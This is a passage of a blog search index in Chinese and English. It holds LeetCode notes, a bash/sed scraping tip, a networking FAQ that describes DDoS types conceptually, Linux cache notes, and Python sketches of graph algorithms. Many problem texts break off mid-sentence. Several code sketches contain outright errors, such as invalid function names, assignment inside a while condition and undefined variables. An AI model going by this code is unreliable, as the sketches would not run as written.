of 1's (also possibly none).You are given a binary string s. You can flip s[i] changing it from 0 to 1 or from 1 to 0.Return the minimum number of flips to make s monotone increasing. Example 1:Input: s = \"00110\"Output: 1Explanation: We flip the last digit to get 00111.Example 2:Input: s = \"010110\"Output: 2Explanation: We flip to get 011111, or alternatively 000111.Example 3:Input: s = \"00011000\"Output: 2Explanation: We flip to get 00000000. Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-93 - Restore IP Addresses","url":"/2021/08/leetcode-93/","content":"動機\n要複習一下怎麼用C++\n\nProblem\nGiven a string s containing only digits, return all possible valid IP addresses that can be obtained from s. You can return them in any order.A valid IP address consists of exactly four integers, each integer is between 0 and 255, separated by single dots and cannot have leading zeros. For example, \"0.1.2.201\" and \"192.168.1.1\" are valid IP addresses and \"0.011.255.245\", \"192.168.1.312\" and \"192.168@1.1\" are invalid IP addresses.  Example 1:Input: s = \"25525511135\"Output: [\"255.255.11.135\",\"255.255.111.35\"]Example 2:Input: s = \"0000\"Output: [\"0.0.0.0\"]Example 3:Input: s = \"1111\"Output: [\"1.1.1.1\"]Example 4:Input: s = \"010010\"Output: [\"0.10.0.10\",\"0.100.1.0\"]Example 5:Input: s = \"101023\"Output: [\"1.0.10.23\",\"1.0.102.3\",\"10.1.0.23\",\"10.10.2.3\",\"101.0.2.3\"] Constraints:t0 ","categories":["Algorithm","Leetcode"],"tags":["String","Backtracking"]},{"title":"leetcode-930 - Binary Subarrays With Sum","url":"/2021/08/leetcode-930/","content":"動機\n用atMost秒殺\n用prefix sum in fly也可以\n\nProblem\nGiven a binary array nums and an integer goal, return the number of non-empty subarrays with a sum goal.\\r\\rA subarray is a contiguous part of the array.\\r\\r \\rExample 1:\\r\\r\\rInput: nums = [1,0,1,0,1], goal = 2\\rOutput: 4\\rExplanation: The 4 subarrays are bolded and underlined below:\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r[1,0,1,0,1]\\r\\r\\rExample 2:\\r\\r\\rInput: nums = [0,0,0,0,0], goal = 0\\rOutput: 15\\r\\r\\r \\rConstraints:\\r\\r\\r1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Prefix Sum","Hash Table","Sliding Window"]},{"title":"leetcode-954 - Array of Doubled Pairs","url":"/2021/08/leetcode-954/","content":"動機\n\n乖乖sort\n用到整數除法注意奇數\n\n\nProblem\nGiven an array of integers arr of even length, return true if and only if it is possible to reorder it such that arr[2 * i + 1] = 2 * arr[2 * i] for every 0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy","Hash Table","Sorting"]},{"title":"leetcode-973 - K Closest Points to Origin","url":"/2021/08/leetcode-973/","content":"動機\nsort與heap差在一個能插入，另一個不能\n\nProblem\nGiven an array of points where points[i] = [xi, yi] represents a point on the X-Y plane and an integer k, return the k closest points to the origin (0, 0).The distance between two points on the X-Y plane is the Euclidean distance (i.e., √(x1 - x2)2 + (y1 - y2)2).You may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in). Example 1:Input: points = [[1,3],[-2,2]], k = 1Output: [[-2,2]]Explanation:The distance between (1, 3) and the origin is sqrt(10).The distance between (-2, 2) and the origin is sqrt(8).Since sqrt(8) < sqrt(10), (-2, 2) is closer to the origin.We only want the closest k = 1 points from the origin, so the answer is just [[-2,2]].Example 2:Input: points = [[3,3],[5,-1],[-2,4]], k = 2Output: [[3,3],[-2,4]]Explanation: The answer [[-2,4],[3,3]] would also be accepted. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Math","Divide and Conquer","Heap (Priority Queue)","Sorting","Geometry","Quickselect"]},{"title":"leetcode-977 - Squares of a Sorted Array","url":"/2021/08/leetcode-977/","content":"動機\n原來已經sort過了!!\n\nProblem\nGiven an integer array nums sorted in non-decreasing order, return an array of the squares of each number sorted in non-decreasing order. Example 1:Input: nums = [-4,-1,0,3,10]Output: [0,1,9,16,100]Explanation: After squaring, the array becomes [16,1,0,9,100].After sorting, it becomes [0,1,9,16,100].Example 2:Input: nums = [-7,-3,2,3,11]Output: [4,9,9,49,121] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-986 - Interval List Intersections","url":"/2021/08/leetcode-986/","content":"動機\n原來這題是greedy阿\n\nProblem\nYou are given two lists of closed intervals, firstList and secondList, where firstList[i] = [starti, endi] and secondList[j] = [startj, endj]. Each list of intervals is pairwise disjoint and in sorted order.Return the intersection of these two interval lists.A closed interval [a, b] (with a < b) denotes the set of real numbers x with a ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Two Pointers"]},{"title":"leetcode-992 - Subarrays with K Different Integers","url":"/2021/08/leetcode-992/","content":"動機\nsliding window的新招式\n\nbinary search的range是左閉右開\n\nlower bound: &gt;=的第一個值\nupper bound: &gt;的第一個值\n\n\nsliding window是左閉右閉\n\natMost: &lt;=目標的所有區間總數\n\n\n\n\nProblem\nGiven an integer array nums and an integer k, return the number of good subarrays of nums.A good array is an array where the number of different integers in that array is exactly k.For example, [1,2,3,1,2] has 3 different integers: 1, 2, and 3.A subarray is a contiguous part of an array. Example 1:Input: nums = [1,2,1,2,3], k = 2Output: 7Explanation: Subarrays formed with exactly 2 different integers: [1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2]Example 2:Input: nums = [1,2,1,3,4], k = 3Output: 3Explanation: Subarrays formed with exactly 3 different integers: [1,2,1,3], [2,1,3], [1,3,4]. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Hash Table","Counting","Sliding Window"]},{"title":"leetcode-995 - Minimum Number of K Consecutive Bit Flips","url":"/2021/08/leetcode-995/","content":"動機\n下次處理flip就要這樣處理\n\nProblem\nYou are given a binary array nums and an integer k.A k-bit flip is choosing a subarray of length k from nums and simultaneously changing every 0 in the subarray to 1, and every 1 in the subarray to 0.Return the minimum number of k-bit flips required so that there is no 0 in the array. If it is not possible, return -1.A subarray is a contiguous part of an array. Example 1:Input: nums = [0,1,0], k = 1Output: 2Explanation: Flip nums[0], then flip nums[2].Example 2:Input: nums = [1,1,0], k = 2Output: -1Explanation: No matter how we flip subarrays of size 2, we cannot make the array become [1,1,1].Example 3:Input: nums = [0,0,0,1,0,1,1,0], k = 3Output: 3Explanation: Flip nums[0],nums[1],nums[2]: nums becomes [1,1,1,1,0,1,1,0]Flip nums[4],nums[5],nums[6]: nums becomes [1,1,1,1,1,0,0,0]Flip nums[5],nums[6],nums[7]: nums becomes [1,1,1,1,1,1,1,1] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Prefix Sum","Bit Manipulation","Sliding Window"]},{"title":"打leetcode API心得","url":"/2021/08/leetcode-api/","content":"動機\n以前只有留解法，之後要看的時候很難一次回想起，這些到底要幹嘛\n所以就研究怎麼打api，抓資料再跑腳本\n\nAPI\n\nJSON\n\nhttps://leetcode.com/api/problems/algorithms/\n回傳所有問題的id與slug\nslug就是查詢問題的key\n\n\nGraphql\n\nhttps://leetcode.com/graphql\n拿詳細資料，有很多東西，可以用dev tools的network去看\n這裡我們要問題的資訊，所以大概像\n\n&#123;&quot;operationName&quot;:&quot;questionData&quot;,&quot;variables&quot;:&#123;&quot;titleSlug&quot;: &quot;two-sum&quot;&#125;,&quot;query&quot;:&quot;query questionData($titleSlug: String!) &#123;  question(titleSlug: $titleSlug) &#123; content topicTags &#123; name &#125; &#125;&#125;&quot;&#125;\n\n\n\n\n\nbash\n這次bash最坑的地方有兩個\n\n用斷行做array分界\n\n\n像是title會有空白，&quot;two sum&quot;，到bash array會變成，[&quot;two, sum&quot;]\n所以要這樣\n\nIFS=$'\\n' topics=($(jq '.topics[]' leetcodes/$id.json))\n但這樣就沒辦法用local，不知道是不能用在local，還是IFS應該放在local後面(但這樣也很怪不是)\n\n\n\n\nsed的append後馬上插入斷行\n\n\n不能用sed -i &quot;/&lt;!--more--&gt;/a \\nhello world，會變成nhello world\n這其實是處理插入多空白的方式sed -i &quot;/&lt;!--more--&gt;/a \\    hello world，會變成    hello world\n要用下面的方式，但是不能縮排，縮排會被算進去\n\n另外還有$'\\nhello world'，在$後面的字串就是c-style，但是因為是single quote，所以不能用var替換QQ\n\n\n\n# \\\\後面就是什麼都可以用了sed -i &quot;/&lt;!--more--&gt;/a\\\\\\n## Problem\\n$&#123;content&#125;\\n&quot; $1\n另外記一下sed插入string到某一行，之後、之前、尾巴的方式\n# Using sed and the pattern described:sed &#x27;/192.168.1.2/s/$/ myalias/&#x27; filesed &#x27;2s/$/ myalias/&#x27; file#Append line after matchsed  &#x27;/\\[option\\]/a Hello World&#x27; input#Insert line before matchsed  &#x27;/\\[option\\]/i Hello World&#x27; input","categories":["Utils","Small project","Bash"]},{"title":"net-faq","url":"/2021/08/net-faq/","content":"動機\n\nOSI 7 layers\n\nHTTP\n\nkeep-alive: 當客戶端傳送另一個請求時，它會使用同一個連接\nIdempotence: 只有POST不是Idempotence\n\nPOST可以看成create資源\n\n\n\n\nDNS\n\nstring 2 IP\niterative &amp; recursive\n\n\nDHCP\n\nDHCP Discover\nDHCP Offer\nDHCP Request\nDHCP ACK\n\n\ntransport\n\nfor application\nTCP\n\n(data header)\n\nsport, dport\nseq, ack\n\n\nconnection oriented\n\nflow control\n\nreceive window\n\nack, ack, … , seq,seq …\n\n\nsending window\n\nseq, seq, …, wait, wait, …\n\nwait, … (not in window)\n\n\n每個出去的pkt會有timer\n\ntimeout會retransmit\n\n\n控制sending window的長度就是flow control\nreceiver會通知rwnd的大小\n\n\n\n\nerror control\n\nchecksum\nack\n\n下一個要的seq\n確認號 為 所收到區段的 最後一個 位元組之 序號 + 1\nDelayed ACK\n\n累積多一點ack\n\n\n\n\nretransmit\n\ndelay, lost, damaged pkt\n\n\nfast retransmit\n\nreceiver: out-of-order pkt\nsender: 收到3個重複的ack\n不等timer直接retransmit\n\n\n\n\ncongestion control\n\nLoss-based\n\n如果retransmit發生就調cwnd\nbufferbloat\n\n大家的buffer都很大\npkt都待在queue\ntcp以為沒有congestion\n狂丟pkt到網路上\n\n\n\n\nsending window = min(RCV.rwnd, cwnd)\n\ncwnd怎麼長\n\nslow start\n\n指數成長\n總不能一直漲\n\nSlow Start Threshold\npacket loss\n\n\n\n\nCongestion Avoidance\n\n線性的長\n\n\nFast Recovery\n\nfast retransmit後到這個狀態\n等看是retransmit還是packet loss\n\n\n\n\n\n\n\n\n\n\n\nsplit packet\n\n\nUDP\n\n\nIP\n\nfor WAN\n(data header)\nIP header不會變!!\n\nmatch\n\n中\n\n直接過去\n\n\n沒中\n\ndefault gateway\n\n\nhow to match\n\nCIDR、netmask\n\n(IP_A &amp; netmask) == (IP_B &amp; netmask)\nnet addr &amp; host addr\n\n\ntable from\n\nRIP\n\nbroacast routing table for 30 secs\nuse metrics to decide to use which ip as dest\n\n\n\n\n\n\n\n\n\n\n\n\nIP 2 MAC &amp; MAC 2 IP\n\nARP\n\nARP spoofing\n\n\nRARP\n\n\ndata link\n\nfor LAN\nethernet\n\n(FCS data header)\nCSMA/CD\n\n傳送特殊阻塞資訊並立即停止傳送資料\n固定時間（一開始是1 contention period times）內等待隨機的時間，再次傳送\n若依舊碰撞，則採用截斷二進位指數避退演算法進行傳送。即十次之內停止前一次「固定時間」的兩倍時間內隨機再發送\n\n\n\n\n\n\nphy\n\ncable\n\n\n\nVPN\n\ntunnel\n\ntunnels are a method for transporting data across a network using protocols that are not supported by that network.\nTunneling works by encapsulating packets: wrapping packets inside of other packets.\n\n\nIPsec\n\nlevel 3\n2個東西\n\nSA\n\nIPsec的參數\n\n封包模式\n\ntransport\n\n用原本的header，加入驗證的資料\n\n\ntunnel\n\n造一個新的header\n\n\n\n\n安全協定\n\nAH\n\n驗證header有沒有被改\nhost 2 host\n\n\nESP\n\n把原pkt加密，再封裝\n所以可以過NAT\nnetwork 2 network\n\n\n\n\n加密演算法\n\n\n\n\nPKI\n\n公私鑰\n驗證身分用\n\n\n\n\nThe purpose of IPsec is to give the remote computer direct access to the central network, making it a full member\n\n\nTLS\n\nlevel 4\n建連線時交換加密法與憑證，生成加密連線\nSecurity is maintained by restricting access to only what’s needed.\nportal mode\n\ncan only be used for web-based programs\n\n\ntunnel mode\n\nusers can access any applications on the network, including ones that are not web based\n\n\n\n\n\nscenario: Ping\n\n如果是string會先過DNS換ip\n生ICMP echo\n建連線，udp socket\n填sport與dport，包udp header\n填sip與dip，包ip header\ndip放到routing table比，看要往哪一台機器丟\n找到dest，用arp換mac\n填smac與dmac，包eth header\n往下，到phy\nrouter解eth header，確認是自己要收，驗FCS\nrouter看ip header，對table，arp，包eth header\n終點就是反著做一次\n\nscenario: Browser\n\n差在tcp\ntcp start\n\n3 handshake\n\nSYN -&gt;\nACK與SYN &lt;-\nACK -&gt;\n\n\nslow start &amp; rwnd…\n\n\n\ntcp end\n\n4 close\n\nFIN -&gt;\n\nFIN_WAIT, CLOSE_WAIT\n\n\nACK &lt;-\n\nFIN_WAIT, CLOSE_WAIT\n\n\nFIN &lt;-\n\nTIME_WAIT, LAST_ACK\n\n\nACK -&gt;\n\n(wait a while) CLOSED, CLOSED\n\n\n\n\n\n\n\n\nexplain\n\nDDoS\n\n目的\n\n利用大量的互聯網流量使目標伺服器或其周圍的基礎設施不堪重負，從而阻斷目標伺服器、服務或網路的正常流量\n\n\n跡象\n\n大量流量 from\n\n同一ip, 同一ip範圍\n單一行為特徵（例如設備類型、地理位置或 Web 瀏覽器版本）的用戶\n對單一頁面或端點的請求\n奇怪的流量模式，如在非正常時段激增，或不自然的模式\n\n\n\n\n攻擊方式\n\nlevel 7\n\nHTTP 洪水: req同一個網頁\nDNS放大: 假的sip去dns query\n\n\nlevel 4\n\nSYN 洪水: 假的sip去建連線\n\n\nlevel 3\n\nping of death\n\n在當時，大部分電腦無法處理大於IPv4最大封包大小（65,535位元組）的ping封包。\n因此發送這樣大小的ping可以令目標電腦崩潰。\nbuffer overflow\n\n\n\n\n\n\n防禦手法\n\n黑洞路由\nRate Limiting\nWeb Application Firewall\n\n反向 Proxy，可使客戶在到達伺服器前通過 WAF\n\n\n\n\n\n\nload balance\n\n自動分配新進來的請求要導到哪一台 Server\n\nlevel 3\n\n分散到各個主機\nECMP\n\n\nlevel 7\n\napplication load balancer (from aws)\n\n分散到group\n\n\npersistence\n\n依據session打散到server\n\n\naffinity\n\n如果把seesion共用，就能\n\n依據busy程度分配load\n\n\n\n\n\n\n\n\n\n\n\nlogic trick?? 邏輯問題\n\n\n找不同重量的球\n\n8顆球，其中1顆撞球比其他顆重了一點，幾次能找到\n兩次\n\n先將所有的撞球平分成三坨：3、3、2\n先比3,3，後面就很好想了\n\n\n\n\n\n一個5公升和3公升的瓶子，請量出4公升的水量\n\n5 -&gt; 3\n\n5 剩下 2\n\n\n5(2) -&gt; 3\n\n3 剩下 1的空間\n\n\n5 -&gt; 3(2)\n最後是4\n\n\n\n醫生給了患者4顆共2種的藥，但他們彼此從外觀並不能分出差別，早上和晚上都得兩種各服一顆\n\n如果他沒按時吃或吃錯的話就會死，結果他不小心把藥搞混了，那他該怎麼做才能分辨哪個是正確的\n那就是把藥全部都切成一半，但是這一半不能再混在一起，早上把其中一半吃掉，晚上再吃另一半就好\n\n\n\n桌子的抽屜裏有如下16張撲克牌:\n\n紅心 A、Q、4\n黑桃 J、8、4、2、7、3\n梅花 K、Q、5、4、6\n方塊 A、5\n把這張牌的點數告訴P先生，把這張牌的花色告訴Q先生\n\nP先生：“我不知道這張牌。”\n\n數字重複: A、Q、4、5\n\n\nQ先生：“我知道你不知道這張牌。”\n\n花色中的數字都是重複的: 紅心、方塊\n\n\nP先生：“現在我知道這張牌了。”\n\n數字唯一: 方塊5\n\n\nQ先生：&quot;我也知道了。\n\n花色中的數字唯一: 方塊5\n\n\n\n\n\n\n\nDS implementation\n\ncircular queue\n\nclass CircularQueue():    def __init__(self, size): # initializing the class        self.size = size                 self.queue = [None for i in range(size)]        self.front = self.rear = -1     def enqueue(self, data):        if ((self.rear + 1) % self.size == self.front):            print(&quot; Queue is Full\\n&quot;)                     # condition for empty queue        elif (self.front == -1):            self.front = 0            self.rear = 0            self.queue[self.rear] = data        else:            self.rear = (self.rear + 1) % self.size            self.queue[self.rear] = data                 def dequeue(self):        if (self.front == -1): # condition for empty queue            print (&quot;Queue is Empty\\n&quot;)                     # condition for only one element        elif (self.front == self.rear):            temp=self.queue[self.front]            self.front = -1            self.rear = -1            return temp        else:            temp = self.queue[self.front]            self.front = (self.front + 1) % self.size            return temp\n\nstack in linked list\n\npush/pop在head\n\n\n\ndef push(head,val):  ret = Node(val)  ret.next = head  return retdef pop(head):  if head:    return [head.val, head.next]  else:    raise StopIteration\nLC\n\nremove duplicate from the linked list\nvalidate binary search tree\ntop k frequen elements\nreverse linked list\ncross byte matching 的 pattern search\n\nbyte: kmp\nbit: bitmask\n\n\n\nmutil core process!!\n\natomic\ncache coherency\n\n","categories":["Network","FAQ"]},{"title":"奔跑吧linux kernel第一章筆記","url":"/2021/08/running-linux-kernel-ch1/","content":"動機\n這書真的很厚，光是第二章就佔了全書的一半，所以就一章一篇吧\n\ncpu\n\nrisc &amp; cisc\n\ncisc有micro operation!!\n\n\nbig, little endian\n\nunion &#123;  int a;  char b;&#125; x;x.a = 1;return (x.b == 1); // true for little-endian\n\n執行過程\n\n課本款: IF &gt; ID &gt; EX &gt; MEM &gt; WB\nx86\n\nfrom L1 cache\nIF+branch predition\nID\ntranslate into micro operation(uops)\ndispatch (out-of-order exec)\nrename (int, float)\nscheduler\nEXE\ncommit results (in-order)\nWB (by LSQ)\nto L1 cache\n\n\narm\n\nfrom L1 cache\nIF+branch predition\nID (可以多路，cortex-A9是2路)\nrename (reg)\ndispatch (out-of-order exec, 可以多路，這裡是4路)\nEXE\nWB (by LSU(LSQ in x86))\nto L1 cache\n\n\n\n\nunit\n\nLSQ: 處理memory consistency &amp; cache coherence\n\nmemory consistency (Read/write的順序是不是對的)\n\nstrict consistency\nsequential consistency\nweak consistency\n\n有資料指令與同步指令(mem barrier)\n\nmem barrier in arm\n\ndata mem barrier: 前面的讀寫操作都完成才會commit DMM後面的結果\ndata sync barrier: 前面的讀寫操作都完成才會執行DSB後面的指令\ninstraction sync barrier: flush pipeline或是buffer後才開始拿ISB後面的指令\n\n\n\n\n\n\n\n\ncache coherence (cache中的資料有效嗎)\n\nMESI protocal\n\ncache與mem一致\n\nE: 獨佔態(只有我有這資料且與mem一樣)\nS: 共用態(多人有這資料且與mem一樣)\n\n\n不一致\n\nI: 無效態\nM: 修改態 (只有我有這資料)\n\n\n監聽protocal (另一種叫directory protocal)\n在4個動作做state transfer\n\n讀寫mem\n讀寫cache\n\n\n\n\n\n\n\n\nsuperscalar arch: 一次發射多條指令\nreg rename:\n\n消滅WAR, WAW\n當某cmd出事時不會影響到後面的指令\n\n\n\n\n\ncache\n\n結構\n\nset: 同一index的cache line(想成有很多張表)\nline: len(mx[i]) (不包含tag, cache line大小一般來說是32Bytes)\nway: matrix(表)\ntag: cache line的MD5\nindex, offset: mx[index][offset]\n\n\nmap 方式\n\ndirect mapping\n\n只有一張表，所以很容易與其他index相同的資料撞\n\ncache thrashing\naddr: tag[31:6], index[5:4], line[3:2], …[1:0]`\n\nline是mx[i][j]的j，index就是i\n\n\n\n\n\n\nset mapping\n\n多張表，讓同index撞的機率變小\n\n\n\n\n\n從哪個addr取cache index\n\nVIVT\n\nvirtual index, virtual tag\n\ncache alias\n\n一個實體addr可以map到多個cache line\n當假addr換了，就要clear或invalidate cache\n\n\n\n\n\n\nVIPT\n\nvirtual index, physical tag\n\n可以同時查TLB與跑MMU\n\n不用怕當假addr換了，就要clear或invalidate cache\n\n\n但還是可能有cache alias\n\n\n\n\nPIPT\n\nphysical index, physical tag\n\n\n\n\n從virtual addr到physical addr的過程\n\ncpu -&gt; MMU -&gt; cache -&gt; 查page table\n在aarch64\n\nvirtual addr(VA): ttbx[64:63], ...[62:48], L0index[47:39], L1index[38:30], L2index[29:21], L3index[20:12], VA[11:0]\n\nttbx有兩個register(ttbx0,ttbx1)分別是高位與低位的page table的base addr\n之後就是用index去每一層table去換下一層的addr\n\npage size: 64KB, 16KB, 4KB\n\n\n\n\nphysical addr(PA): ...[64:63], ...[62:48], PA(from table)[47:12], PA(from virtual addr)[11:0]\n\n\n\n\ncache與linux kernel的關係是\n\nkernel大部分資料結構都是與cache line對齊的\n\n不然會橫跨兩條以上的cache line需要invalidate時會把另一個也一起劃掉\n\n\n\n\ncache evict策略\n\nrandom\nfifo\nlru\n\n\n多process與TLB關係?\n\n多process會讓VA常常需要去換PA，這很慢\n所以有TLB去cache，以page為單位\n\n如果process很大，可以適時把page size拉大，讓TLB不容易爆cache\n\n\n\n\n\n","categories":["System","Linux","Reading"]},{"title":"最短距離演算法簡單筆記","url":"/2021/08/shortest-path/","content":"動機\n就簡單地(口頭)描述演算法的重點在哪\n話說這讓我想起許多做過的leetcode\n\n手法\n\ngreedy\n\n選大(結果變大)\n去掉小(可能性變大)\n\n沒辦法就當前資訊知道結果\n\n\n\n\nBFS\n\n走的node數最少\n\n\n列舉就是往組成的東西下手\n\n距離就會是 中點、起點\n\n\n\nshortest-path\nBFS\n類別: BFS(走的node數最少)\n從起點往外擴散，直到起點\n每個點之間的距離都是一樣的，所以決定到終點之間距離多遠，是中間有多少點\ndef bfs(graph, start, end):  vis = set()  q = deque([(start,0)])  while q:    node, dis = q.popleft()    if node is end:      return dis    else:      vis.add(node)      q.extend([(x, dis+1) for x in graph[node] if x not in vis])  return -1 # cycle exists\nDijkstra\n類別: BFS+greedy(能走過去的邊)\n現在點之間的距離會變，所以需要一個表紀錄從起點到這個點的最短距離\n會需要挑最短的下一個點，所以還要Heap去sort下一個最短的點\ndef dijkstra(graph, start, end):  hq = [(0,start)] # heapq  dists = defaultdict(lambda : float(&#x27;inf&#x27;)) # node -&gt; distance  dists[start] = 0  while hq:    dis, node = heappop(hq)    for x,w in graph[node]:      if dists[node]+w &lt; dists[x]:        dists[x] = dists[node]+w        heappush(hq, (dists[x], x))      return dists[end]\nFloyd-Warshall\n類別: 列舉(中間點)\n試過每個中間點，在比原本距離小時更新，同時這可以知道所有點到另一個點的最短距離\ndef floyd-warshall(graph, start, end):  dists = defaultdict(lambda : float(&#x27;inf&#x27;)) # node -&gt; distance  dists[(start,start)] = 0    for mid in graph.keys():    for a in graph.keys():      for b in graph.keys():         if dists[(a,b)] &gt; dists[(a,mid)]+graph[mid][b]:          dists[(a,b)] = dists[(a,mid)]+graph[mid][b]  return dists[(start,end)]\nBellman–Ford\n類別: 列舉(起點)\n最長的長度就是所以點都走過一次(所以可以避免負環一直走的問題)\n一直延長每個點的長度，最後就是最短路徑\ndef bellman–ford(graph, start, end):  dists = defaultdict(lambda : float(&#x27;inf&#x27;)) # node -&gt; distance  dists[(start,start)] = 0    for _ in len(graph.keys()):    for a in graph.keys():      for b,w in graph[a]:         if dists[b] &gt; dists[a]+w:          dists[b] = dists[a]+w  if any(dists[b] &gt; dists[a]+w for a in graph.keys() for b,w in graph[a]): # negtive cycle    return None  else:    return dists[end]\nMinimum Spanning Tree\nPrim\n類別: BFS+greedy(能走過去的邊)\nDijkstra是距離，dist[a]+graph[a][b]\nPrim，一樣是求最小，一樣點之間的距離會變，但SMT只要edge最小就好，所以用heap每次挑最小的edge\ndef prim(graph):  start = next(graph.keys())  hq = [(0,start)] # heapq  dists = defaultdict(lambda : float(&#x27;inf&#x27;)) # node -&gt; distance  parent = &#123;&#125;  dists[start] = 0  parent[start] = None  while hq:    dis, node = heappop(hq)    for x,w in graph[node]:      if w &lt; dists[x]: # HERE!!        parent[x] = node        dists[x] = w        heappush(hq, (dists[x], x))      return parent\nKruskal\n類別: greedy(邊)\n每次挑最小的edge去湊，直到變成一棵樹\ndef kruskal(graph):  hq = []  for a in graph.keys():    for b,w in graph[a]:      heappush(hq, (w, (a,b)))    uf = &#123;k:k for k in graph.keys()&#125;  ranks = &#123;k:1 for k in graph.keys()&#125;  def find(a):    while a != uf[a]:      a = uf[a]    return a  def union(a,b):    if find(a) != find(b):      if ranks[a] &gt;= ranks[b]:        uf[b] = a        rank[a] += rank[b]      else:        uf[a] = uf[b]        rank[b] += rank[a]  vis = set()  while len(vis) &lt; len(graph.keys()):    _, (a,b) = heappop(hq)    if a in vis and b in vis:      continue    else:      [vis.add(x) for x in (a,b)]      union(a,b)  return uf\nFlow Networks\n這裡要求的是讓流過的水量最大\n這個不像距離，每走一步就知道當前距離多少。\n這要走到最後才會知道bottleneck在哪。\nFord-Fulkerson\n類別: greedy(用到的edge最少, 所以算是BFS)\n我們沒辦法就當前資訊知道結果如何，但可以在每次選擇中保留可能性\n讓path用到的edge越少越好 (讓總edge的quota剩的多)\n並且每次只丟掉最小的edge!!\n所以用BFS讓走的node數最少，這樣就ok了\ndef BFS(graph, s, t):    queue = deque()    parent = &#123;&#125;    queue.append(s)    parent[s] = None    while queue:      a = queue.popleft()      for b, val in enumerate(graph[a]):          if b not in parent and val &gt; 0: # 不走0，每次只丟掉最小的edge              queue.append(b)              parent[b] = a          if b == t:              return parent    return Falsedef FordFulkerson(source, sink):    max_flow = 0    while (parent = BFS(graph, source, sink)) :        path_flow = float(&quot;Inf&quot;)        s = sink        while s != source:            path_flow = min(path_flow, graph[parent[s]][s])            s = parent[s]        max_flow +=  path_flow        v = sink        while(v != source):            u = parent[v]            graph[u][v] -= path_flow # 不走0，每次只丟掉最小的edge            graph[v][u] += path_flow # 反向流            v = parent[v]    return max_flow","categories":["Algorithm","Classic"]},{"title":"Topological sort","url":"/2021/08/topo-sort/","content":"動機\ntopo sort的重點是怎麼從對的點開始加，像是dfs就要特別注意，不像bfs會有in_degree確認，dfs就是走，什麼都不管\n\nDFS\n從*終點(沒有到其他node的edge)*開始往後走，最後的結果要reverse，因為是從終點開始放\n另外會有個table去放，node是處理完畢還是處理中的狀態\ndef topologicalSortUtil(self, v, visited, stack):    if visited[v] == 1:      raise &#x27;loop&#x27;    elif visited[v] == 2:      return    visited[v] = 1    for i in self.graph[v]:        if visited[i] == False:            self.topologicalSortUtil(i, visited, stack)    stack.append(v)    visited[v] = 2 def topologicalSort(self):    visited = [0]*self.V    stack = []     for i in range(self.V):        if visited[i] == 0:            self.topologicalSortUtil(i, visited, stack)    print(stack[::-1])  # return list in reverse order\nBFS (Kahn’s algorithm)\n從*起點(沒有其他node指到他)*開始往前走，因為要看被多少node指到，所以一個table要另外算\n之後就是一直找沒有被指到的邊緣node，加到結果\n這裡處理loop就是看bfs結束時是不是所有node都有加到結果，因為loop一定會指到，所以不會被bfs當成邊緣node\ndef topologicalSort(self):    in_degree = [0]*(self.V)         for i in self.graph:        for j in self.graph[i]:            in_degree[j] += 1     queue = [queue.append(i) for i in range(self.V) if in_degree[i] == 0]     cnt = 0    top_order = []    while queue:        u = queue.pop(0)        top_order.append(u)        for i in self.graph[u]:            in_degree[i] -= 1            if in_degree[i] == 0:                queue.append(i)         cnt += 1     if cnt != self.V:        print &quot;There exists a cycle in the graph&quot;    else :        print top_order","categories":["Algorithm","Classic"]},{"title":"external sort","url":"/2021/09/external-sort/","content":"動機\n\nmerge sort as a sorting framework\nmerge sort其實不用分到最後一個才merge，merge時才sort是因為沒有其他手法，如果有其他sort?\n可以直接切成各個小list去sort，之後就是merge\nexternal merge sort\n如果記憶體有限，可以把大檔案(list)，分成小檔案，把小檔案放到mem做一般的sort\n之後把記憶體分成\n\n放每個小檔案的sublist\n\n\n各自的buffer為空時就往下讀\n\n\n輸出merge結果的list\n\n\n滿了就放到目標檔案\n\n","categories":["Algorithm","Classic"]},{"title":"leetcode-1007 - Minimum Domino Rotations For Equal Row","url":"/2021/09/leetcode-1007/","content":"動機\nlee215的解法依舊漂亮\n\nProblem\nIn a row of dominoes, tops[i] and bottoms[i] represent the top and bottom halves of the ith domino. (A domino is a tile with two numbers from 1 to 6 - one on each half of the tile.)We may rotate the ith domino, so that tops[i] and bottoms[i] swap values.Return the minimum number of rotations so that all the values in tops are the same, or all the values in bottoms are the same.If it cannot be done, return -1. Example 1:Input: tops = [2,1,2,4,2,2], bottoms = [5,2,6,2,3,2]Output: 2Explanation: The first figure represents the dominoes as given by tops and bottoms: before we do any rotations.If we rotate the second and fourth dominoes, we can make every value in the top row equal to 2, as indicated by the second figure.Example 2:Input: tops = [3,5,1,2,3], bottoms = [3,6,3,3,4]Output: -1Explanation: In this case, it is not possible to rotate the dominoes to make one row of values equal. Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["Array","Greedy"]},{"title":"leetcode-1038 - Binary Search Tree to Greater Sum Tree","url":"/2021/09/leetcode-1038/","content":"動機\n順著走就好\n\nProblem\nGiven the root of a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus sum of all keys greater than the original key in BST.As a reminder, a binary search tree is a tree that satisfies these constraints:The left subtree of a node contains only nodes with keys less than the node's key.The right subtree of a node contains only nodes with keys greater than the node's key.Both the left and right subtrees must also be binary search trees.Note: This question is the same as 538: https://leetcode.com/problems/convert-bst-to-greater-tree/ Example 1:Input: root = [4,1,6,0,2,5,7,Leetcode,null,null,3,null,null,null,8]Output: [30,36,21,36,35,26,15,null,null,null,33,null,null,null,8]Example 2:Input: root = [0,null,1]Output: [1,null,1]Example 3:Input: root = [1,0,2]Output: [3,3,2]Example 4:Input: root = [3,2,4,1]Output: [7,9,4,10] Constraints:The number of nodes in the tree is in the range [1, 100].0 ","categories":["Algorithm","Leetcode"],"tags":["Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-1109 - Corporate Flight 